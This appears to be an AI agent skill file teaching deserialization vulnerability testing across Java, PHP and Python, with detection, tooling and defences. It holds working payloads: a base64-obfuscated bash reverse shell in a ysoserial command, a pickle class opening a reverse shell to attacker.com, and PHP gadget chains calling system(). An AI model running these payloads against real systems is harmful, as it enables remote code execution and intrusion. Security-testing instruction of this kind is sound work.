---
name: deserialization-testing
description: Professional methodology and practical checks for deserialization vulnerability testing.
version: 1.0.0
---

# Deserialization Vulnerability Testing

## Overview

Deserialization vulnerabilities occur when an application deserializes untrusted data. They can lead to remote code execution, denial of service, and other impacts. This skill provides methods for detecting, exploiting, and preventing deserialization vulnerabilities.

## Vulnerability Principle

When an application converts serialized data back into objects, and that data comes from an untrusted source, an attacker may be able to craft malicious serialized data that executes arbitrary code during deserialization.

## Common Formats

### Java

**Common libraries:**
- Native Java serialization
- Jackson
- Fastjson
- XStream
- Apache Commons Collections

### PHP

**Common functions:**
- unserialize()
- json_decode()

### Python

**Common modules:**
- pickle
- yaml
- json

### .NET

**Common classes:**
- BinaryFormatter
- SoapFormatter
- DataContractSerializer

## Testing Methods

### 1. Identify serialized data

**Java serialization indicators:**
```
AC ED 00 05 (hex)
rO0 (Base64)
```

**PHP serialization indicators:**
```
O:8:"stdClass"
a:2:{s:4:"test";s:4:"data";}
```

**Python pickle indicators:**
```
\x80\x03
```

### 2. Find deserialization points

**Common locations:**
- Cookie values
- Session data
- API parameters
- File uploads
- Cached data
- Message queues

### 3. Java deserialization

**Apache Commons Collections exploitation:**
```java
// Use ysoserial to generate a payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
```

**Common gadget chains:**
- CommonsCollections1-7
- Spring1-2
- ROME
- Jdk7u21

### 4. PHP deserialization

**Basic test:**
```php
<?php
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Test());
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

**Magic-method exploitation:**
- __destruct()
- __wakeup()
- __toString()
- __call()

### 5. Python pickle

**Basic test:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickle.dumps(RCE())
```

## Exploitation Techniques

### Java RCE

**Use ysoserial:**
```bash
# Generate a payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin

# Base64 encode it
base64 -w 0 payload.bin
```

**Manual construction:**
```java
// Build a malicious object with a gadget chain
// Refer to the ysoserial source code
```

### PHP RCE

**Use a POP chain:**
```php
<?php
class A {
    public $b;
    function __destruct() {
        $this->b->test();
    }
}

class B {
    public $c;
    function test() {
        call_user_func($this->c, "id");
    }
}

$a = new A();
$a->b = new B();
$a->b->c = "system";
echo serialize($a);
?>
```

### Python RCE

**Pickle RCE:**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

## Bypass Techniques

### Encoding bypass

**Base64 encoding:**
```
Original: rO0ABXNy...
Encoded:  ck8wQUJYTnk...
```

**URL encoding:**
```
%72%4F%00%AB...
```

### Filter bypass

**Use different gadget chains:**
- If Commons Collections is filtered, try Spring.
- If one version is filtered, try other versions.

### Class-name obfuscation

**Use reflection:**
```java
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
```

## Tool Usage

### ysoserial

```bash
# List available gadgets
java -jar ysoserial.jar

# Generate a payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin

# Generate Base64
java -jar ysoserial.jar CommonsCollections1 "command" | base64
```

### PHPGGC

```bash
# List available gadgets
./phpggc -l

# Generate a payload
./phpggc Monolog/RCE1 system id

# Generate an encoded payload
./phpggc -b Monolog/RCE1 system id
```

### Burp Suite

1. Intercept a request containing serialized data.
2. Use an extension to generate a payload.
3. Replace the original data.
4. Observe the response.

## Verification and Reporting

### Verification steps

1. Confirm that the serialized data is controllable.
2. Verify that deserialization triggers code execution.
3. Assess impact, such as RCE or data disclosure.
4. Record a complete proof of concept.

### Reporting points

- Vulnerable location and serialized data format
- Gadget chain or exploitation method used
- Complete exploitation steps and PoC
- Remediation advice, such as input validation and safer serialization formats

## Defensive Measures

### Recommended approaches

1. **Avoid deserializing untrusted data**
   - Use JSON instead where possible.
   - Use safe serialization formats.

2. **Input validation**
   ```java
   // Allowlist class names
   private static final Set<String> ALLOWED_CLASSES =
       Set.of("com.example.SafeClass");

   private Object readObject(ObjectInputStream ois) {
       // Validate class names
       // ...
   }
   ```

3. **Use safe configuration**
   ```java
   // Jackson guidance
   // Avoid unsafe global default typing for untrusted input.
   // If polymorphic deserialization is required, use an explicit allowlist:
   BasicPolymorphicTypeValidator ptv =
       BasicPolymorphicTypeValidator.builder()
           .allowIfSubType("com.example.safe.")
           .build();
   objectMapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);
   ```

4. **Class-loader isolation**
   - Use a custom ClassLoader.
   - Restrict loadable classes.

5. **Monitoring and logging**
   - Log deserialization operations.
   - Monitor abnormal behavior.

## Notes

- Test only in authorized environments.
- Account for gadget-chain differences between library versions.
- Pay attention to payload size limits during testing.
- Identify the target application's dependency versions.
